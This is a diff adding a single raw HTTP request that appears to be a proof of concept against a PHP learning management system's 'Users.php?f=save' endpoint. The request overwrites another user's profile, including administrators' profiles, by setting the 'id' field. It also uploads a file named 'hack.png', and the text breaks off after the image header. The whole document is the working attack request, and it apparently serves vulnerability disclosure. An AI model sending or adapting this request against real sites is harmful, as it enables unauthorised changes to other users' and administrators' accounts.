@@ -1,0 +1,48 @@
+POST /php-lms/classes/Users.php?f=save HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------38244968796537297751592545024
+Content-Length: 8393
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/php-lms/admin/?page=user
+Cookie: PHPSESSID=3oor3gc9ih6iq8fu6qpjf50si8
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+X-PwnFox-Color: green
+
+-----------------------------38244968796537297751592545024
+Content-Disposition: form-data; name="id"
+
+'7' # ID of the target user (including administrators) whose file we want to modify
+-----------------------------38244968796537297751592545024
+Content-Disposition: form-data; name="firstname"
+
+testtt
+-----------------------------38244968796537297751592545024
+Content-Disposition: form-data; name="middlename"
+
+testMiddle 
+-----------------------------38244968796537297751592545024
+Content-Disposition: form-data; name="lastname"
+
+te Last Name 
+-----------------------------38244968796537297751592545024
+Content-Disposition: form-data; name="username"
+
+staff
+-----------------------------38244968796537297751592545024
+Content-Disposition: form-data; name="password"
+
+
+-----------------------------38244968796537297751592545024
+Content-Disposition: form-data; name="img"; filename="hack.png"
+Content-Type: image/png
+
+PNG
+....
